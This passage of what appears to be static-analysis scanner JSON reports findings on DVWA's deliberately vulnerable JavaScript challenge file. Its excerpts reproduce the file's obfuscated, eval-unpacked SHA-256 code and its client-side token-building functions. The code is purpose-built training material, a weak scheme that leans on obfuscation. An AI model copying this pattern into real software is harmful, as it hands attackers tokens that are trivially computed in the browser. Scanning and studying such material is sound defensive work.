\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&lt;7));1D=b&amp;c;1j=1D^(b&amp;d)^1V;1h=(f&amp;g)^(~f&amp;h);v=e+1b+1h+K[j+3]+l[j+3];1f=1a+1j;e=a+v&lt;&lt;0;a=v+1f&lt;&lt;0}k.C=k.C+a&lt;&lt;0;k.B=k.B+b&lt;&lt;0;k.E=k.E+c&lt;&lt;0;k.F=k.F+d&lt;&lt;0;k.J=k.J+e&lt;&lt;0;k.I=k.I+f&lt;&lt;0;k.H=k.H+g&lt;&lt;0;k.D=k.D+h&lt;&lt;0};N.Q.1e=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x201e=m[(C&gt;&gt;28)&amp;o]+m[(C&gt;&gt;24)&amp;o]+m[(C&gt;&gt;20)&amp;o]+m[(C&gt;&gt;16)&amp;o]+m[(C&gt;&gt;12)&amp;o]+m[(C&gt;&gt;8)&amp;o]+m[(C&gt;&gt;4)&amp;o]+m[C&amp;o]+m[(B&gt;&gt;28)&amp;o]+m[(B&gt;&gt;24)&amp;o]+m[(B&gt;&gt;20)&amp;o]+m[(B&gt;&gt;16)&amp;o]+m[(B&gt;&gt;12)&amp;o]+m[(B&gt;&gt;8)&amp;o]+m[(B&gt;&gt;4)&amp;o]+m[B&amp;o]+m[(E&gt;&gt;28)&amp;o]+m[(E&gt;&gt;24)&amp;o]+m[(E&gt;&gt;20)&amp;o]+m[(E&gt;&gt;16)&amp;o]+m[(E&gt;&gt;12)&amp;o]+m[(E&gt;&gt;8)&amp;o]+m[(E&gt;&gt;4)&amp;o]+m[E&amp;o]+m[(F&gt;&gt;28)&amp;o]+m[(F&gt;&gt;24)&amp;o]+m[(F&gt;&gt;20)&amp;o]+m[(F&gt;&gt;16)&amp;o]+m[(F&gt;&gt;12)&amp;o]+m[(F&gt;&gt;8)&amp;o]+m[(F&gt;&gt;4)&amp;o]+m[F&amp;o]+m[(J&gt;&gt;28)&amp;o]+m[(J&gt;&gt;24)&amp;o]+m[(J&gt;&gt;20)&amp;o]+m[(J&gt;&gt;16)&amp;o]+m[(J&gt;&gt;12)&amp;o]+m[(J&gt;&gt;8)&amp;o]+m[(J&gt;&gt;4)&amp;o]+m[J&amp;o]+m[(I&gt;&gt;28)&amp;o]+m[(I&gt;&gt;24)&amp;o]+m[(I&gt;&gt;20)&amp;o]+m[(I&gt;&gt;16)&amp;o]+m[(I&gt;&gt;12)&amp;o]+m[(I&gt;&gt;8)&amp;o]+m[(I&gt;&gt;4)&amp;o]+m[I&amp;o]+m[(H&gt;&gt;28)&amp;o]+m[(H&gt;&gt;24)&amp;o]+m[(H&gt;&gt;20)&amp;o]+m[(H&gt;&gt;16)&amp;o]+m[(H&gt;&gt;12)&amp;o]+m[(H&gt;&gt;8)&amp;o]+m[(H&gt;&gt;4)&amp;o]+m[H&amp;o];p(!k.x){1e+=m[(D&gt;&gt;28)&amp;o]+m[(D&gt;&gt;24)&amp;o]+m[(D&gt;&gt;20)&amp;o]+m[(D&gt;&gt;16)&amp;o]+m[(D&gt;&gt;12)&amp;o]+m[(D&gt;&gt;8)&amp;o]+m[(D&gt;&gt;4)&amp;o]+m[D&amp;o]}A\\x201e};N.Q.2U=N.Q.1e;N.Q.1G=w(){k.1s();q\\x20C=k.C,B=k.B,E=k.E,F=k.F,J=k.J,I=k.I,H=k.H,D=k.D;q\\x202b=[(C&gt;&gt;24)&amp;u,(C&gt;&gt;16)&amp;u,(C&gt;&gt;8)&amp;u,C&amp;u,(B&gt;&gt;24)&amp;u,(B&gt;&gt;16)&amp;u,(B&gt;&gt;8)&amp;u,B&amp;u,(E&gt;&gt;24)&amp;u,(E&gt;&gt;16)&amp;u,(E&gt;&gt;8)&amp;u,E&amp;u,(F&gt;&gt;24)&amp;u,(F&gt;&gt;16)&amp;u,(F&gt;&gt;8)&amp;u,F&amp;u,(J&gt;&gt;24)&amp;u,(J&gt;&gt;16)&amp;u,(J&gt;&gt;8)&amp;u,J&amp;u,(I&gt;&gt;24)&amp;u,(I&gt;&gt;16)&amp;u,(I&gt;&gt;8)&amp;u,I&amp;u,(H&gt;&gt;24)&amp;u,(H&gt;&gt;16)&amp;u,(H&gt;&gt;8)&amp;u,H&amp;u];p(!k.x){2b.4A((D&gt;&gt;24)&amp;u,(D&gt;&gt;16)&amp;u,(D&gt;&gt;8)&amp;u,D&amp;u)}A\\x202b};N.Q.27=N.Q.1G;N.Q.2R=w(){k.1s();q\\x201w=O\\x20Z(k.x?28:32);q\\x201i=O\\x204x(1w);1i.1p(0,k.C);1i.1p(4,k.B);1i.1p(8,k.E);1i.1p(12,k.F);1i.1p(16,k.J);1i.1p(20,k.I);1i.1p(24,k.H);p(!k.x){1i.1p(28,k.D)}A\\x201w};w\\x201P(G,x,1v){q\\x20i,T=1c\\x20G;p(T===\\x272p\\x27){q\\x20L=[],W=G.W,M=0,r;1g(i=0;i&lt;W;++i){r=G.1Q(i);p(r&lt;R){L[M++]=r}z\\x20p(r&lt;2v){L[M++]=(2t|(r&gt;&gt;6));L[M++]=(R|(r&amp;V))}z\\x20p(r&lt;2A||r&gt;=2E){L[M++]=(2D|(r&gt;&gt;12));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}z{r=2C+(((r&amp;23)&lt;&lt;10)|(G.1Q(++i)&amp;23));L[M++]=(2X|(r&gt;&gt;18));L[M++]=(R|((r&gt;&gt;12)&amp;V));L[M++]=(R|((r&gt;&gt;6)&amp;V));L[M++]=(R|(r&amp;V))}}G=L}z{p(T===\\x271n\\x27){p(G===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;G.1J===Z){G=O\\x202r(G)}z\\x20p(!1z.1K(G)){p(!1y||!Z.1N(G)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}}p(G.W&gt;1k){G=(O\\x20N(x,1d)).S(G).27()}q\\x201F=[],2e=[];1g(i=0;i&lt;1k;++i){q\\x20b=G[i]||0;1F[i]=4z^b;2e[i]=4y^b}N.1I(k,x,1v);k.S(2e);k.1F=1F;k.2c=1d;k.1v=1v}1P.Q=O\\x20N();1P.Q.1s=w(){N.Q.1s.1I(k);p(k.2c){k.2c=1O;q\\x202W=k.27();N.1I(k,k.x,k.1v);k.S(k.1F);k.S(2W);N.Q.1s.1I(k)}};q\\x20X=2a();X.1q=X;X.1H=2a(1d);X.1q.2V=2f();X.1H.2V=2f(1d);p(2G){2g.X=X}z{Y.1q=X.1q;Y.1H=X.1H;p(2s){2l(w(){A\\x20X})}}})();w\\x202y(e){1g(q\\x20t=\\x22\\x22,n=e.W-1;n&gt;=0;n--)t+=e[n];A\\x20t}w\\x202J(t,y=\\x224B\\x22){1m.1o(\\x221M\\x22).1r=1q(1m.1o(\\x221M\\x22).1r+y)}w\\x202B(e=\\x224E\\x22){1m.1o(\\x221M\\x22).1r=1q(e+1m.1o(\\x221M\\x22).1r)}w\\x202K(a,b){1m.1o(\\x221M\\x22).1r=2y(1m.1o(\\x222F\\x22).1r)}1m.1o(\\x222F\\x22).1r=\\x22\\x22;4u(w(){2B(\\x224M\\x22)},4N);1m.1o(\\x224P\\x22).4Q(\\x224R\\x22,2J);2K(\\x223O\\x22,44);&#39;,&#39;||||||||||||||||||||this|blocks|HEX_CHARS||0x0F|if|var|code|message||0xFF|t1|function|is224||else|return|h1|h0|h7|h2|h3|key|h6|h5|h4||bytes|index|Sha256|new|method|prototype|0x80|update|type|SHIFT|0x3f|length|exports|root|ArrayBuffer|||||||||||s0|s1|typeof|true|hex|t2|for|ch|dataView|maj|64|ERROR|document|object|getElementById|setUint32|sha256|value|finalize|Error|throw|sharedMemory|buffer|obj|ARRAY_BUFFER|Array|start|ab|block|bc|OUTPUT_TYPES|oKeyPad|digest|sha224|call|constructor|isArray|hashed|token|isView|false|HmacSha256|charCodeAt|WINDOW|crypto|create|finalized|cd|hash|outputType|Buffer|da||||0x3ff||||array|||createMethod|arr|inner|process|iKeyPad|createHmacMethod|module|notString|hBytes|first|createHmacOutputMethod|define|createOutputMethod|algorithm|NODE_JS|string|null|Uint8Array|AMD|0xc0|lastByteIndex|0x800|EXTRA|createHash|do_something|nodeMethod|0xd800|token_part_2|0x10000|0xe0|0xe000|phrase|COMMON_JS|4294967296|window|token_part_3|token_part_1|WEB_WORKER|self|require|eval|nodeWrap|versions|arrayBuffer|JS_SHA256_NO_NODE_JS|undefined|toString|hmac|innerHash|0xf0|0xa2bfe8a1|0xc24b8b70||0xa81a664b||0x92722c85|0x81c2c92e|0xc76c51a3|0x53380d13|0x766a0abb|0x4d2c6dfc|0x650a7354|0x748f82ee|0x84c87814|0x78a5636f|0x682e6ff3|0x8cc70208|0x2e1b2138|0xa4506ceb|0x90befffa|0xbef9a3f7|0x5b9cca4f|0x4ed8aa4a|0x106aa070|0xf40e3585|0xd6990624|0x19a4c116|0x1e376c08|0x391c0cb3|0x34b0bcb5|0x2748774c|0xd192e819|0x0fc19dc6|32768|128|8388608|2147483648|split|0x428a2f98|0x71374491|0x59f111f1|0x3956c25b|0xe9b5dba5|0xb5c0fbcf|0123456789abcdef|JS_SHA256_NO_ARRAY_BUFFER|is|invalid|input|strict|use|JS_SHA256_NO_WINDOW|ABCD|amd|JS_SHA256_NO_COMMON_JS|global|node|0x923f82a4|0xab1c5ed5|0x983e5152|0xa831c66d|0x76f988da|0x5cb0a9dc|0x4a7484aa|0xb00327c8|0xbf597fc7|0x14292967|0x06ca6351||0xd5a79147|0xc6e00bf3|0x2de92c6f|0x240ca1cc|0x550c7dc3|0x72be5d74|0x243185be|0x12835b01|0xd807aa98|0x80deb1fe|0x9bdc06a7|0xc67178f2|0xefbe4786|0xe49b69c1|0xc19bf174|0x27b70a85|0x3070dd17|300032|1413257819|150054599|24177077|56|4294967295|0x5be0cd19|while|setTimeout|704751109|210244248|DataView|0x36|0x5c|push|ZZ|Object|143694565|YY|0x1f83d9ab|1521486534|0x367cd507|0xc1059ed8|0xffc00b31|0x68581511|0x64f98fa7|XX|300|0x9b05688c|send|addEventListener|click|utf8|0xbefa4fa4|0xf70e5939|0x510e527f|0xbb67ae85|0x6a09e667|0x3c6ef372|0xa54ff53a|JS_SHA256_NO_ARRAY_BUFFER_IS_VIEW&#39;,&#39;split&#39;];(function(c,d){var e=function(f){while(--f){c[&#39;push&#39;](c[&#39;shift&#39;]());}};e(++d);}(a,0x1f4));var b=function(c,d){c=c-0x0;var e=a[c];return e;};eval(function(d,e,f,g,h,i){h=function(j){return(j&lt;e?&#39;&#39;:h(parseInt(j/e)))+((j=j%e)&gt;0x23?String[b(&#39;0x0&#39;)](j+0x1d):j[b(&#39;0x1&#39;)](0x24));};if(!&#39;&#39;[b(&#39;0x2&#39;)](/^/,String)){while(f--){i[h(f)]=g[f]||h(f);}g=[function(k){if(&#39;wpA&#39;!==b(&#39;0x3&#39;)){return i[k];}else{while(f--){i[k(f)]=g[f]||k(f);}g=[function(l){return i[l];}];k=function(){return b(&#39;0x4&#39;);};f=0x1;}}];h=function(){return b(&#39;0x4&#39;);};f=0x1;};while(f--){if(g[f]){if(b(&#39;0x5&#39;)===b(&#39;0x6&#39;)){return i[h];}else{d=d[b(&#39;0x2&#39;)](new RegExp(&#39;\\x5cb&#39;+h(f)+&#39;\\x5cb&#39;,&#39;g&#39;),g[f]);}}}return d;}(b(&#39;0x7&#39;),0x3e,0x137,b(&#39;0x8&#39;)[b(&#39;0x9&#39;)](&#39;|&#39;),0x0,{}));\n\n",
        "startLocationLine": 1,
        "startLocationColumn": 8399,
        "endLocationLine": 1,
        "endLocationColumn": 8403
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "var a=[&#39;fromCharCode&#39;,&#39;toString&#39;,&#39;replace&#39;,&#39;BeJ&#39;,&#39;\\x5cw+&#39;,&#39;Lyg&#39;,&#39;SuR&#39;,&#39;(w(){\\x273M\\x203L\\x27;q\\x201l=\\x273K\\x203I\\x203J\\x20T\\x27;q\\x201R=1c\\x202I===\\x271n\\x27;q\\x20Y=1R?2I:{};p(Y.3N){1R=1O}q\\x202L=!1R&amp;&amp;1c\\x202M===\\x271n\\x27;q\\x202o=!Y.2S&amp;&amp;1c\\x202d===\\x271n\\x27&amp;&amp;2d.2Q&amp;&amp;2d.2Q.3S;p(2o){Y=3R}z\\x20p(2L){Y=2M}q\\x202G=!Y.3Q&amp;&amp;1c\\x202g===\\x271n\\x27&amp;&amp;2g.X;q\\x202s=1c\\x202l===\\x27w\\x27&amp;&amp;2l.3P;q\\x201y=!Y.3H&amp;&amp;1c\\x20Z!==\\x272T\\x27;q\\x20m=\\x273G\\x27.3z(\\x27\\x27);q\\x202w=[-3y,3x,3v,3w];q\\x20U=[24,16,8,0];q\\x20K=[3A,3B,3F,3E,3D,3C,3T,3U,4d,4c,4b,49,4a,4e,4f,4j,4i,4h,3u,48,47,3Z,3Y,3X,3V,3W,40,41,46,45,43,42,4k,3f,38,36,39,37,34,33,2Y,31,2Z,35,3t,3n,3m,3l,3o,3p,3s,3r,3q,3k,3j,3d,3a,3c,3b,3e,3h,3g,3i,4g];q\\x201E=[\\x271e\\x27,\\x2727\\x27,\\x271G\\x27,\\x272R\\x27];q\\x20l=[];p(Y.2S||!1z.1K){1z.1K=w(1x){A\\x204C.Q.2U.1I(1x)===\\x27[1n\\x201z]\\x27}}p(1y&amp;&amp;(Y.50||!Z.1N)){Z.1N=w(1x){A\\x201c\\x201x===\\x271n\\x27&amp;&amp;1x.1w&amp;&amp;1x.1w.1J===Z}}q\\x202m=w(1X,x){A\\x20w(s){A\\x20O\\x20N(x,1d).S(s)[1X]()}};q\\x202a=w(x){q\\x20P=2m(\\x271e\\x27,x);p(2o){P=2P(P,x)}P.1T=w(){A\\x20O\\x20N(x)};P.S=w(s){A\\x20P.1T().S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2m(T,x)}A\\x20P};q\\x202P=w(P,x){q\\x201S=2O(\\x222N(\\x271S\\x27)\\x22);q\\x201Y=2O(\\x222N(\\x271w\\x27).1Y\\x22);q\\x202n=x?\\x271H\\x27:\\x271q\\x27;q\\x202z=w(s){p(1c\\x20s===\\x272p\\x27){A\\x201S.2x(2n).S(s,\\x274S\\x27).1G(\\x271e\\x27)}z{p(s===2q||s===2T){1u\\x20O\\x201t(1l)}z\\x20p(s.1J===Z){s=O\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\x201S.2x(2n).S(O\\x201Y(s)).1G(\\x271e\\x27)}z{A\\x20P(s)}};A\\x202z};q\\x202k=w(1X,x){A\\x20w(G,s){A\\x20O\\x201P(G,x,1d).S(s)[1X]()}};q\\x202f=w(x){q\\x20P=2k(\\x271e\\x27,x);P.1T=w(G){A\\x20O\\x201P(G,x)};P.S=w(G,s){A\\x20P.1T(G).S(s)};1g(q\\x20i=0;i&lt;1E.W;++i){q\\x20T=1E[i];P[T]=2k(T,x)}A\\x20P};w\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\x202h,T=1c\\x20s;p(T!==\\x272p\\x27){p(T===\\x271n\\x27){p(s===2q){1u\\x20O\\x201t(1l)}z\\x20p(1y&amp;&amp;s.1J===Z){s=O\\x202r(s)}z\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\x20O\\x201t(1l)}}}z{1u\\x20O\\x201t(1l)}2h=1d}q\\x20r,M=0,i,W=s.W,l=k.l;4t(M&lt;W){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){l[i&gt;&gt;2]|=s[M]&lt;&lt;U[i++&amp;3]}}z{1g(i=k.1A;M&lt;W&amp;&amp;i&lt;1k;++M){r=s.1Q(M);p(r&lt;R){l[i&gt;&gt;2]|=r&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2v){l[i&gt;&gt;2]|=(2t|(r&gt;&gt;6))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z\\x20p(r&lt;2A||r&gt;=2E){l[i&gt;&gt;2]|=(2D|(r&gt;&gt;12))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}z{r=2C+(((r&amp;23)&lt;&lt;10)|(s.1Q(++M)&amp;23));l[i&gt;&gt;2]|=(2X|(r&gt;&gt;18))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;12)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|((r&gt;&gt;6)&amp;V))&lt;&lt;U[i++&amp;3];l[i&gt;&gt;2]|=(R|(r&amp;V))&lt;&lt;U[i++&amp;3]}}}k.2u=i;k.L+=i-k.1A;p(i&gt;=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L&gt;4r){k.2i+=k.L/2H&lt;&lt;0;k.L=k.L%2H}A\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i&gt;&gt;2]|=2w[i&amp;3];k.1C=l[16];p(i&gt;=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i&lt;&lt;3|k.L&gt;&gt;&gt;29;l[15]=k.L&lt;&lt;3;k.1W()};N.Q.1W=w(){q\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j&lt;1k;++j){v=l[j-15];1a=((v&gt;&gt;&gt;7)|(v&lt;&lt;25))^((v&gt;&gt;&gt;18)|(v&lt;&lt;14))^(v&gt;&gt;&gt;3);v=l[j-2];1b=((v&gt;&gt;&gt;17)|(v&lt;&lt;15))^((v&gt;&gt;&gt;19)|(v&lt;&lt;13))^(v&gt;&gt;&gt;10);l[j]=l[j-16]+1a+l[j-7]+1b&lt;&lt;0}1D=b&amp;c;1g(j=0;j&lt;1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o&lt;&lt;0;d=v+4p&lt;&lt;0}z{1B=4v;v=l[0]-4w;h=v-4G&lt;&lt;0;d=v+4D&lt;&lt;0}k.2j=1O}z{1a=((a&gt;&gt;&gt;2)|(a&lt;&lt;30))^((a&gt;&gt;&gt;13)|(a&lt;&lt;19))^((a&gt;&gt;&gt;22)|(a&lt;&lt;10));1b=((e&gt;&gt;&gt;6)|(e&lt;&lt;26))^((e&gt;&gt;&gt;11)|(e&lt;&lt;21))^((e&gt;&gt;&gt;25)|(e&lt;&lt;7));1B=a&amp;b;1j=1B^(a&amp;c)^1D;1h=(e&amp;f)^(~e&amp;g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v&lt;&lt;0;d=v+1f&lt;&lt;0}1a=((d&gt;&gt;&gt;2)|(d&lt;&lt;30))^((d&gt;&gt;&gt;13)|(d&lt;&lt;19))^((d&gt;&gt;&gt;22)|(d&lt;&lt;10));1b=((h&gt;&gt;&gt;6)|(h&lt;&lt;26))^((h&gt;&gt;&gt;11)|(h&lt;&lt;21))^((h&gt;&gt;&gt;25)|(h&lt;&lt;7));1Z=d&amp;a;1j=1Z^(d&amp;b)^1B;1h=(h&amp;e)^(~h&amp;f);v=g+1b+1h+K[j+1]+l[j+1];1f=1a+1j;g=c+v&lt;&lt;0;c=v+1f&lt;&lt;0;1a=((c&gt;&gt;&gt;2)|(c&lt;&lt;30))^((c&gt;&gt;&gt;13)|(c&lt;&lt;19))^((c&gt;&gt;&gt;22)|(c&lt;&lt;10));1b=((g&gt;&gt;&gt;6)|(g&lt;&lt;26))^((g&gt;&gt;&gt;11)|(g&lt;&lt;21))^((g&gt;&gt;&gt;25)|(g&lt;&lt;7));1V=c&amp;d;1j=1V^(c&amp;a)^1Z;1h=(g&amp;h)^(~g&amp;e);v=f+1b+1h+K[j+2]+l[j+2];1f=1a+1j;f=b+v&lt;&lt;0;b=v+1f&lt;&lt;0;1a=((b&gt;&gt;&gt;2)|(b&lt;&lt;30))^((b&gt;&gt;&gt;13)|(b&lt;&lt;19))^((b&gt;&gt;&gt;22)|(b&lt;&lt;10));1b=((f&gt;&gt;&gt;6)|(f&lt;&lt;26))^((f&gt;&gt;&gt;11)|(f&lt;&lt;21))^((f&gt;&gt;&gt;25)|(f&lt;&l